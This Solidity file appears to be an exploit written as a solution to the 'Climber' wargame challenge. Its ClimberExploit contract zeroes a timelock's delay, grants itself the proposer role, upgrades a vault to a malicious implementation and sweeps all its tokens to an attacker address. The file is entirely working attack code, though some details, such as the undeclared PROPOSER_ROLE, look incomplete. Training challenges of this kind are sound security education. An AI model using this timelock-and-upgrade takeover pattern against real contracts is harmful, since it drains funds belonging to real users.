
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";

contract ClimberVaultAttack is ClimberVault {
    function sweep(IERC20 token, address attackerAddress) public {
        token.transfer(attackerAddress, token.balanceOf(address(this)));
    }
}

contract ClimberExploit {
    ClimberVault vault;
    ClimberTimelock timelock;
    IERC20 token;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(ClimberVault _vault, ClimberTimelock _timelock, IERC20 _token) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
    }

    function exploit() public payable {
        targets = [address(timelock), address(timelock), address(vault), address(vault)];
        values = [0, 0, 0, 0]; // ETH value to send can be 0.
        dataElements = [
            // 1st data record: set delay to 0, so execution is instant
            abi.encodeWithSelector(timelock.updateDelay.selector, 0),
            // 2nd data record: grant our contract PROPOSER role so we can propose executions
            abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this)),

            // 3rd data record: upgrade vault to our attack
            abi.encodeWithSelector(
                vault.upgradeToAndCall.selector,
                address(new ClimberVaultAttack())
            ),

            // 4th data record: call sweep
            abi.encodeWithSelector(
                ClimberVaultAttack.sweep.selector,
                address(token), 
                address(this)
            )
        ];

        timelock.schedule(targets, values, dataElements, 0);
        
        // Calls `execute` on `timelock` with all these prepared arguments.
        timelock.execute(targets, values, dataElements, 0);


    }

    function scheduleOperation() public payable {
        timelock.schedule(targets, values, dataElements, 0);
    }
}